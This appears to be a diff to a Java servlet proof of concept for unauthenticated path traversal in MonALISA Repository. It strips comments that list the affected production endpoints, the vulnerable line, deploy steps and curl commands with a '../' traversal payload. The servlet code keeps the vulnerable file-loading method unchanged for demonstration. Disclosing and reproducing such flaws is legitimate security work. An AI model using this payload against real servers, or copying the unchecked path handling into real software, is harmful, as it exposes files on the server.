@@ -3,38 +3,7 @@ import javax.servlet.http.*;
 import java.io.*;
 import java.util.*;
 
-/**
- * Proof of concept for unauthenticated path traversal in MonALISA Repository.
- *
- * The getProperties() method below is a verbatim copy of
- * src/lia/web/servlets/web/Utils.java, method getProperties(), lines 284-335.
- * No logic has been modified. The only additions are the doGet() handler and
- * the response output, which print the resolved filesystem path and the parsed
- * properties so the traversal is observable in the HTTP response.
- *
- * In the production codebase this method is called directly from:
- *
- *   display.java:766    Utils.getProperties(sConfDir, gets("page"), null, true)
- *   genimage.java:50    Utils.getProperties(sConfDir, gets("page"))
- *   stats.java:131      Utils.getProperties(sConfDir, gets("page"))
- *   simple.java:84      Utils.getProperties(sConfDir, gets("page"), null, true)
- *   FarmMap.java:308    Utils.getProperties(sConfDir, gets("page"))
- *   Panel.java:61       Utils.getProperties(sConfDir, gets("page"))
- *   ThreadedPage.java:1025  Utils.getProperties(sConfDir, sPage, null, true)
- *
- * None of these endpoints have a security-constraint in web.xml.
- *
- * To compile:
- *   javac -classpath servlet-api.jar PocServlet.java
- *
- * To deploy:
- *   Place PocServlet.class in WEB-INF/classes of any Tomcat webapp.
- *   Register it in web.xml mapped to /display with no security-constraint.
- *
- * To reproduce:
- *   curl "http://localhost:8080/monalisa/display?page=global"
- *   curl "http://localhost:8080/monalisa/display?page=../../../../../../../../tmp/ml_db"
- */
+
 public class PocServlet extends HttpServlet {
 
     private String sConfDir;
@@ -45,12 +14,7 @@ public class PocServlet extends HttpServlet {
         sConfDir = getServletContext().getRealPath("/") + "WEB-INF/conf/";
     }
 
-    // -------------------------------------------------------------------------
-    // Verbatim copy of Utils.getProperties() from Utils.java:284
-    // The only vulnerable line is 313 in the original:
-    //   String sFullFileName = sConfDir + sFile + ".properties";
-    // sFile is attacker-controlled via the HTTP 'page' parameter.
-    // -------------------------------------------------------------------------
+
     private Properties getProperties(String sConfDir, String sFileName,
                                      String[] resolvedPaths) {
         Properties prop = new Properties();
@@ -97,12 +61,12 @@ public class PocServlet extends HttpServlet {
                 pTemp.putAll(prop);
                 prop = pTemp;
             } catch (IOException e) {
-                // Production code silently swallows — preserved here
+
             }
         }
         return prop;
     }
-    // -------------------------------------------------------------------------
+
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp)
